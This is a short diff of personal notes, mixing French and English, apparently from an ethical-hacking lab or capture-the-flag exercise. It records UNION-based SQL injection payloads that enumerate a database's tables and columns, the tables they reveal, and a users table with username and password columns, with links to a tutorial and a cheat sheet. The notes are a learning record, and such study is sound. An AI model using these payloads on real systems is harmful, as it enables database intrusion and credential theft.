@@ -1,15 +1,13 @@
 http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/
 
-SQL injection pour get le tableau 
+SQL injection pour get les tableaux qu'on a:
 1 or 1=1 union select null, table_name from information_schema.tables
 --> db_default, users, guestbook, list_images, vote_dbs
 
 
-1 union (SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'users')
-
-
 https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
 
+On get columns des tableaux:
 1 union SELECT table_name, column_name FROM information_schema.columns
 
 db_default : id, username, password
